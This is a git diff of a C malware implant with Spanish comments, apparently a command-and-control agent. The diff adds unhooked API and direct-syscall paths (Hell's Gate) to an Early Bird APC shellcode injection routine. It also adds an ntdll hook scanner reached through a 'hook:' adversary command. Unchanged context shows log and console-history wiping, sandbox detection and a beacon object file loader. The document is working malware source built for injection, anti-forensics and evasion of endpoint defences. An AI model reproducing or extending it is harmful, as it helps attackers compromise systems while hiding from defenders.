         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
@@ -3392,7 +3682,7 @@ void cleanSystemLogs() {
     system("del /f /q %TEMP%\\*.tmp 2>nul");
 
     // 4. Limpiar el historial de comandos de la consola (cmd.exe)
-    HANDLE hConOut = CreateFileA("CONOUT$", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+    HANDLE hConOut = CreateFileA_Unhooked("CONOUT$", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
     if (hConOut != INVALID_HANDLE_VALUE) {
         DWORD written;
         WriteConsoleA(hConOut, "\x1b[2J\x1b[H", 7, &written, NULL); // ANSI clear screen
@@ -3526,7 +3816,7 @@ BOOL isSandboxEnvironment() {
 
     // 4. Dispositivos de disco virtual
     if (GetDriveTypeA("C:\\") == DRIVE_FIXED) {
-        HANDLE h = CreateFileA("\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+        HANDLE h = CreateFileA_Unhooked("\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
         if (h != INVALID_HANDLE_VALUE) {
             STORAGE_PROPERTY_QUERY query = { StorageDeviceProperty };
             STORAGE_DEVICE_DESCRIPTOR descriptor;
@@ -3808,7 +4098,7 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
     SIZE_T size = (shellcode_len + 4095) & ~4095;
     LPVOID pRemoteMem = NULL;
 
-    // 🔹 NtAllocateVirtualMemory (syscall)
+    // NtAllocateVirtualMemory (syscall)
     HellsGate(ssn_alloc);
     NTSTATUS status = HellDescent(
         (DWORD64)hProcess,
@@ -3830,9 +4120,9 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
     printf("[+] Memoria remota asignada: 0x%p\n", pRemoteMem);
     fflush(stdout);
     Sleep(GetJitteredSleep(SLEEP_BASE));
-    // 🔹 WriteProcessMemory (API normal, más estable que NtWriteVirtualMemory syscall)
-    if (!WriteProcessMemory(hProcess, pRemoteMem, shellcode, shellcode_len, NULL)) {
-        printf("[-] WriteProcessMemory falló: %lu\n", GetLastError());
+    // WriteProcessMemory_Unhooked
+    if (!WriteProcessMemory_Unhooked(hProcess, pRemoteMem, shellcode, shellcode_len, NULL)) {
+        printf("[-] WriteProcessMemory_Unhooked falló: %lu\n", GetLastError());
         fflush(stdout);
 
         TerminateProcess(pi.hProcess, 1);
@@ -3844,19 +4134,38 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
     printf("[+] Shellcode escrito en proceso remoto.\n");
     fflush(stdout);
 
-    // 🔹 VirtualProtectEx (API normal) - más discreto que NtProtectVirtualMemory
+    
+    // NtProtectVirtualMemory unhooked
     ULONG oldProtect = 0;
-    if (!VirtualProtectEx(hProcess, pRemoteMem, size, PAGE_EXECUTE_READ, &oldProtect)) {
-        printf("[-] VirtualProtectEx falló: %lu\n", GetLastError());
-        fflush(stdout);
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
-        return FALSE;
+    if (g_pNtProtectVirtualMemoryUnhooked) {
+        NTSTATUS status = g_pNtProtectVirtualMemoryUnhooked(
+            hProcess,
+            &pRemoteMem,
+            &size,
+            PAGE_EXECUTE_READ,
+            &oldProtect
+        );
+        if (!NT_SUCCESS(status)) {
+            printf("[-] NtProtectVirtualMemory unhooked falló: 0x%08X\n", status);
+            fflush(stdout);
+            CloseHandle(pi.hThread);
+            CloseHandle(pi.hProcess);
+            return FALSE;
+        }
+    } else {
+        // Fallback
+        if (!VirtualProtectEx(hProcess, pRemoteMem, size, PAGE_EXECUTE_READ, &oldProtect)) {
+            printf("[-] VirtualProtectEx falló: %lu\n", GetLastError());
+            fflush(stdout);
+            CloseHandle(pi.hThread);
+            CloseHandle(pi.hProcess);
+            return FALSE;
+        }
     }
     printf("[+] Protección cambiada a PAGE_EXECUTE_READ.\n");
     fflush(stdout);
 
-    // 🔹 NtQueueApcThread (syscall)
+    // NtQueueApcThread (syscall)
     HellsGate(ssn_apc);
     status = HellDescent(
         (DWORD64)hThread,
@@ -3873,14 +4182,33 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
     printf("[+] APC enqueued via NtQueueApcThread.\n");
     fflush(stdout);
 
-    // 🔹 NtResumeThread (syscall)
+    // 🔹 NtResumeThread unhooked
     DWORD suspendCount;
-    HellsGate(ssn_resume);
-    status = HellDescent(
-        (DWORD64)hThread,
-        (DWORD64)&suspendCount,
-        0, 0, 0, 0
-    );
+    if (g_pNtResumeThreadUnhooked) {
+        status = g_pNtResumeThreadUnhooked(hThread, &suspendCount);
+        if (!NT_SUCCESS(status)) {
+            printf("[-] NtResumeThread unhooked falló: 0x%08X\n", status);
+            fflush(stdout);
+            CloseHandle(pi.hThread);
+            CloseHandle(pi.hProcess);
+            return FALSE;
+        }
+    } else {
+        // Fallback a Hell's Gate si el stub no está disponible
+        HellsGate(ssn_resume);
+        status = HellDescent(
+            (DWORD64)hThread,
+            (DWORD64)&suspendCount,
+            0, 0, 0, 0
+        );
+        if (!NT_SUCCESS(status)) {
+            printf("[-] NtResumeThread (Hell's Gate) falló: 0x%08X\n", status);
+            fflush(stdout);
+            CloseHandle(pi.hThread);
+            CloseHandle(pi.hProcess);
+            return FALSE;
+        }
+    }
     if (status != STATUS_SUCCESS) {
         printf("[-] NtResumeThread falló: 0x%08lX\n", (unsigned long)status);
         fflush(stdout);
@@ -4728,12 +5056,78 @@ void go(unsigned char * bof_data, int bof_size, char * args, int args_len) {
     BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Ejecutando con argumento: '%.*s' (len=%d)", 
                 args_len, args, args_len);
     
-    // ✅ Ya NO necesitamos alineación manual aquí - RunCOFF se encarga
+    // Ya NO necesitamos alineación manual aquí - RunCOFF se encarga
     int result = RunCOFF("go", bof_data, bof_size, (unsigned char*)args, args_len);
     
     BeaconPrintf(CALLBACK_OUTPUT, "[BOF] RunCOFF result = %d", result);
 }
 
+int hooked()
+{
+    PDWORD functionAddress = (PDWORD)0;
+    
+    // Get ntdll base address
+    HMODULE libraryBase = LoadLibraryA("ntdll");
+    if (!libraryBase) {
+        printf("Failed to load ntdll.dll\n");
+        return 1;
+    }
+
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
+    PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);
+
+    // Locate export address table
+    DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);
+
+    // Offsets to list of exported functions and their names
+    PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
+    PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
+    PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);
+
+    // Iterate through exported functions of ntdll
+    for (DWORD i = 0; i < imageExportDirectory->NumberOfNames; i++)
+    {
+        // Resolve exported function name
+        DWORD functionNameRVA = addressOfNamesRVA[i];
+        DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
+        char* functionName = (char*)functionNameVA;
+        
+        // Resolve exported function address
+        DWORD_PTR functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
+        functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);
+
+        // Syscall stubs start with these bytes
+        unsigned char syscallPrologue[4] = { 0x4c, 0x8b, 0xd1, 0xb8 };
+
+        // Only interested in Nt|Zw functions
+        if ((strncmp(functionName, "Nt", 2) == 0 || strncmp(functionName, "Zw", 2) == 0))
+        {
+            // Check if the first 4 bytes of the exported function match the syscall prologue
+            if (memcmp(functionAddress, syscallPrologue, 4) != 0) 
+            {
+                if (*((unsigned char*)functionAddress) == 0xE9) // first byte is a jmp instruction
+                {
+                    DWORD jumpTargetRelative = *((PDWORD)((char*)functionAddress + 1));
+                    PDWORD jumpTarget = (PDWORD)((char*)functionAddress + 5 + jumpTargetRelative);  
+                    char moduleNameBuffer[512] = {0};
+                    if (GetMappedFileNameA(GetCurrentProcess(), jumpTarget, moduleNameBuffer, sizeof(moduleNameBuffer))) {
+                        printf("Hooked: %s : %p into module %s\n", functionName, functionAddress, moduleNameBuffer);
+                    } else {
+                        printf("Hooked: %s : %p (failed to resolve target module)\n", functionName, functionAddress);
+                    }
+                }
+                else
+                {
+                    printf("Potentially hooked: %s : %p\n", functionName, functionAddress);
+                }
+            }
+        }
+    }
+
+    FreeLibrary(libraryBase);
+    return 0;
+}
 // Función principal de manejo de comandos
 void handleAdversary(char* command) {
     printf("[*] Handling adversary command: %s\n", command);
@@ -5126,6 +5520,12 @@ void handleAdversary(char* command) {
 
         go(bof_data, bof_size, args, args ? strlen(args) : 0);
         free(bof_data);
+        goto send_response;
+    }
+
+    if (strncmp(command, "hook:", 5) == 0) {
+        hooked();
+        snprintf(output, sizeof(output), "get syscalls hooked");
         goto send_response;
     }
 
